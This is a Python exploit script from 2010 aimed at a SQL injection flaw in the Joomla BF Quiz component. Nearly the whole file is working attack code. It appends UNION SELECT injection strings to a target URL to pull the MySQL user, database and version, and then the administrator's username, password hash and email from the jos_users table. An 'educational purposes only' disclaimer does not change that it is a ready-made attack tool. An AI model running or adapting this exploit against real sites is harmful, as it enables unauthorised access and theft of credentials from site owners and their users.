#!/usr/bin/python

# Joomla Component BF Quiz SQL Injection Exploit
# by Valentin Hoebel (valentin@xenuser.org)
# Version 1.0 (29th May 2010)
# ASCII FOR BREAKFAST

# About the vulnerability:
# ----------------------------------------------------------------------------
# Read more here:
# http://xenuser.org/documents/security/joomla_com_bfquiz_sqli.txt

# About the exploit:
# ----------------------------------------------------------------------------
# Tries to give you the admin password hash!

# Usage example:
# python joomla_com_bfquiz_sploit.py - u "http://target/index.php?option=com_bfquiztrial&view=bfquiztrial&catid=34"

# This tool war written for educational purposes only. I am not responsible for any damage
# you might cause using this tool. Know and respect your local laws!
# Only use this tool on websites you are allowed to test :)

# Greetz && THX
# ----------------------------------------------------------------------------------
# Greetz: cr4wl3r and /JosS
# Greetz && THX to: inj3ct0r, Exploit DB team, hack0wn and packetstormsecurity.org

# Power to the cows!

import sys,  re,  urllib,  urllib2,  string
from urllib2 import Request, urlopen, URLError, HTTPError

# Prints usage
def print_usage():
    print ""
    print ""
    print "________________________________________________"
    print "Joomla Component BF Quiz SQL Injection Exploit"
    print "by Valentin Hoebel (valentin@xenuser.org)"
    print ""
    print "            (__)        "
    print "            (oo)     Version 1.0 (29th May 2010)  "
    print "     /-------\/         "
    print "    / |     ||           "
    print "   *  ||----||           "
    print "      ~~    ~~       Power to teh cows!"
    print "________________________________________________"
    print ""
    print "Exploits the SQL injection vulnerability I"
    print "discovered within the Joomla component BF Quiz."
    print ""
    print "Usage example:"
    print "python joomla_com_bfquiz_sploit.py - u \"http://target/index.php?option=com_bfquiztrial&view=bfquiztrial&catid=34\""
    print ""
    print "Options:"
    print " -u <URL>   (start the exploit)"
    print " --help     (displays this text)"
    print ""
    print "Features:"
    print " - Check if provided URL is reachable"
    print " - Display current database, MySQL user and the MySQL version"
    print " - Display the password hash of the Joomla administrator"
    print ""
    print ""
    return

#Prints banner
def print_banner():
    print ""
    print ""
    print "________________________________________________"
    print "Joomla Component BF Quiz SQL Injection Exploit"
    print "by Valentin Hoebel (valentin@xenuser.org)"
    print ""
    print "            (__)        "
    print "            (oo)     Version 1.0 (29th May 2010)  "
    print "     /-------\/         "
    print "    / |     ||           "
    print "   *  ||----||           "
    print "      ~~    ~~       Power to teh cows!"
    print "________________________________________________"
    return

# Testing if URL is reachable, with error handling
def test_url():
    print "[.] Checking if connection can be established..."
    try:
        response = urllib2.urlopen(provided_url)

    except HTTPError,  e:
        print "[!] The connection could not be established."
        print "[!] Error code: ",  e.code
        print "[!]Exiting now!"
        print ""
        sys.exit(1)
    except URLError,  e:
        print "[!] The connection could not be established."
        print "[!] Reason: ",  e.reason
        print "[!] Exiting now!"
        print ""
        sys.exit(1)
    else:
        valid_target = 1
        print "[.] Connected to target! URL seems to be valid."
    return

def exploit_url():
    # Define injection string for reading out basic information
    information_injection_string = "+AND+1=2+UNION+SELECT+1,2,3,4,5,6,7,8,9,concat_ws(0x3b,0x503077337220743020743368206330777321,user(),database(),version(),0x503077337220743020743368206330777321),11,12,13,14,concat_ws(0x3b,0x503077337220743020743368206330777321,user(),database(),version(),0x503077337220743020743368206330777321),15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,concat_ws(0x3b,0x503077337220743020743368206330777321,user(),database(),version(),0x503077337220743020743368206330777321),79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,concat_ws(0x3b,0x503077337220743020743368206330777321,user(),database(),version(),0x503077337220743020743368206330777321),97,98,99,100--"
    admin_pass_hash_injection_string = "+AND+1=2+UNION+SELECT+1,2,3,4,5,6,7,8,9,concat_ws(0x3b,0x503077337220743020743368206330777321,id,name,username,password,email,usertype,0x503077337220743020743368206330777321),11,12,13,14,concat_ws(0x3b,0x503077337220743020743368206330777321,id,name,username,password,email,usertype,0x503077337220743020743368206330777321),15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,concat_ws(0x3b,0x503077337220743020743368206330777321,id,name,username,password,email,usertype,0x503077337220743020743368206330777321),79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,concat_ws(0x3b,0x503077337220743020743368206330777321,id,name,username,password,email,usertype,0x503077337220743020743368206330777321),97,98,99,100+from+jos_users+LIMIT+0,1--"

    # Craft the URLs which are about to be exploited
    exploit_url_information = provided_url+information_injection_string
    exploit_url_admin_pass_hash = provided_url+admin_pass_hash_injection_string

    # Read out some interesting stuff
    print "[.] Reading out some interesting information..."
    response = urllib2.urlopen(exploit_url_information)
    html = response.read()

    # Now extract the interesting information
    get_secret_data = string.find(html,  "P0w3r t0 t3h c0ws!")

    # If  the target is not vulnerable exit
    if get_secret_data == -1:
        print "[!] Exploitation failed. Maybe the target isn't vulnerable?"
        print "[!] Hint: The exploit doesn't work on every target by default."
        print "[!] If you have knowledge about MySQL injection simply have a look at the source code and change the injection strings."
        print "[!] For me it worked on 3/10 targets by default."
        print "[!] Exiting now!"
        print ""
        sys.exit(1)

    get_secret_data += 18
    new_html4= html[get_secret_data :]
    new_get_secret_data4 = string.find(new_html4,  "P0w3r t0 t3h c0ws!")
    new_html_5 = new_html4[:new_get_secret_data4]

    # Data was received, now format and display it
    formatted_output = str.split(new_html_5,  ";")
    print "[+] MySQL Database User: ",  formatted_output[1:2]
    print "[+] MySQL Database: ",  formatted_output[2:3]
    print "[+] MySQL Version: ",  formatted_output[3:4]

    # Now let's get the admin password hash!
    print "[.] Getting the admin password hash..."
    response = urllib2.urlopen(exploit_url_admin_pass_hash)
    html = response.read()
    get_secret_data = string.find(html,  "P0w3r t0 t3h c0ws!")
    get_secret_data += 18
    new_html = html[get_secret_data :]
    new_get_secret_data = string.find(new_html,  "P0w3r t0 t3h c0ws!")
    new_html_2 = new_html[:new_get_secret_data]

    # Data was received, now format and display it
    formatted_output = str.split(new_html_2,  ";")
    print "[+] ID: ",  formatted_output[1:2]
    print "[+] Name: ",  formatted_output[2:3]
    print "[+] Username: ",  formatted_output[3:4]
    print "[+] Password Hash: ",  formatted_output[4:5]
    print "[+] E-Mail Address: ",  formatted_output[5:6]
    print "[+] User status: ",  formatted_output[6:7]
    print "[.] That's it! Bye!"
    print ""
    sys.exit(1)
    return

# Checking if argument was provided
if len(sys.argv) <=1:
    print_usage()
    sys.exit(1)

for arg in sys.argv:
    # Checking if help was called
    if arg == "--help":
        print_usage()
        sys.exit(1)

    # Checking if  URL was provided, if yes -> go!
    if arg == "-u":
        provided_url = sys.argv[2]
        print_banner()

        # At first we test if we can actually reach the provided URL
        test_url()

        # Now start the main exploit function
        exploit_url()

### EOF ###